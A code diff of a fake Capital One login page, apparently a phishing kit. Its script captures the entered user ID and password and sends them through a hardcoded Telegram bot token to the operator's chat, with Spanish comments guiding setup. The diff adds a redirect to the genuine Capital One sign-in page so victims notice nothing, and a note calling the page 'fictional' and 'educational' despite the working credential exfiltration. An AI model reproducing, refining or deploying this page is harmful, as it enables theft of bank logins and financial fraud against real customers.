@@ -18,7 +18,7 @@
       background-color: white;
       padding: 30px;
       border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
       width: 100%;
       max-width: 400px;
       text-align: center;
@@ -62,18 +62,17 @@
       margin-top: 15px;
       font-size: 12px;
       color: #777;
+      clear: both;
     }
   </style>
 </head>
 <body>
   <div class="login-container">
-    <img
-      src="https://files.catbox.moe/5npen5.png"
-      alt="SecureBank Logo"
-      class="logo"
-    />
+    <!-- Logo -->
+    <img src="https://files.catbox.moe/5npen5.png" alt="SecureBank Logo" class="logo" />
+    
     <h2>Capital One Login</h2>
-    <form id="loginForm" novalidate>
+    <form id="loginForm" method="post" novalidate>
       <label for="username">User ID</label>
       <input
         type="text"
@@ -82,6 +81,7 @@
         placeholder="Enter your user ID"
         required
       />
+
       <label for="password">Password</label>
       <input
         type="password"
@@ -90,47 +90,42 @@
         placeholder="Enter your password"
         required
       />
+
       <button type="submit">Sign In</button>
     </form>
-    <div class="note"></div>
+    <div class="note">This is a fictional login page for educational use only.</div>
   </div>
 
   <script>
-    document
-      .getElementById("loginForm")
-      .addEventListener("submit", function (e) {
-        e.preventDefault();
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault(); // evitar envío normal
 
-        const user = document.getElementById("username").value;
-        const pass = document.getElementById("password").value;
+      const user = document.getElementById('username').value;
+      const pass = document.getElementById('password').value;
 
-        const token = "7941669083:AAFCmw6OPwXWy_hTryvFkcIz_mqd8OydRQM"; // tu token
-        const chat_id = TU_CHAT_ID; // reemplaza con tu chat ID numérico
+      // Cambia estos por tu token y chat_id reales
+      const token = '7941669083:AAFCmw6OPwXWy_hTryvFkcIz_mqd8OydRQM';
+      const chat_id = TU_CHAT_ID; // reemplaza TU_CHAT_ID por el número real
 
-        const message = `🔐 CapitalOne Login\n👤 Usuario: ${user}\n🔑 Contraseña: ${pass}`;
+      const message = `🔐 CapitalOne Login\n👤 Usuario: ${user}\n🔑 Contraseña: ${pass}`;
 
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: chat_id,
-            text: message,
-          }),
-        })
-          .then((response) => {
-            if (response.ok) {
-              alert("Login enviado correctamente.");
-              document.getElementById("loginForm").reset();
-            } else {
-              alert("Error enviando el login.");
-            }
-          })
-          .catch(() => {
-            alert("Error enviando el login.");
-          });
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message,
+        }),
+      })
+      .then(response => {
+        // Aquí rediriges después de enviar el mensaje, no antes
+        window.location.href = 'https://www.capitalone.com/commercial/sign-in/';
+      })
+      .catch(error => {
+        // En caso de error también redirige
+        window.location.href = 'https://www.capitalone.com/commercial/sign-in/';
       });
+    });
   </script>
 </body>
 </html>
